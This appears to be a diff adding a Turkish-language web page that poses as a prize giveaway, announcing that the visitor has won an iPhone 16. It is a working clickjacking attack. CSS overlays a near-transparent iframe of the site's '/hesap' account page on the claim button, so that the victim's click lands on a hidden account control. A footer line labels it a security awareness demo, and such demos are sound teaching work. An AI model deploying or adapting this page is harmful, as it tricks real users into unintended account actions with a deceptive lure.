@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Büyük Çekiliş · Ödülünüzü Alın</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{min-height:100vh;background:linear-gradient(135deg,#5b2db8,#2d6cb8);
+      font-family:system-ui,-apple-system,"Segoe UI",sans-serif;color:#fff;
+      display:flex;align-items:center;justify-content:center;padding:20px}
+    .promo{max-width:460px;text-align:center}
+    .promo .emoji{font-size:64px;margin-bottom:10px}
+    .promo h1{font-size:34px;font-weight:800;line-height:1.15;margin-bottom:12px}
+    .promo p{font-size:16px;opacity:.92;margin-bottom:28px}
+    /* Yem konteyneri: butonu ve (gelecek) iframe'i ustuste koymak icin konumlandirma referansi */
+    .bait{position:relative;display:inline-block}
+    .bait .win-btn{background:#ffd93b;color:#3a2a00;border:none;font-size:20px;font-weight:700;
+      padding:10px 20px;border-radius:14px;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.25)}
+    .promo .fine{margin-top:22px;font-size:12px;opacity:.6}
+
+    .bait iframe{
+      position:absolute;
+      top:-622px;     
+      left:-20px;     
+      width:560px;
+      height:760px;
+      border:0;
+      opacity:0.0001;     
+      z-index:10;
+    }
+  </style>
+</head>
+<body>
+  <div class="promo">
+    <div class="emoji">🎉</div>
+    <h1>Tebrikler! iPhone 16 Kazandınız</h1>
+    <p>Bugünün şanslı ziyaretçisi sizsiniz. Ödülünüzü almak için aşağıdaki butona tıklamanız yeterli.</p>
+
+    <div class="bait">
+      <button class="win-btn">Ödülümü Al 🎁</button>
+        <iframe src="/hesap"></iframe>
+    </div>
+
+    <p class="fine">* Bu bir güvenlik farkındalık demosudur.</p>
+  </div>
+</body>
+</html>
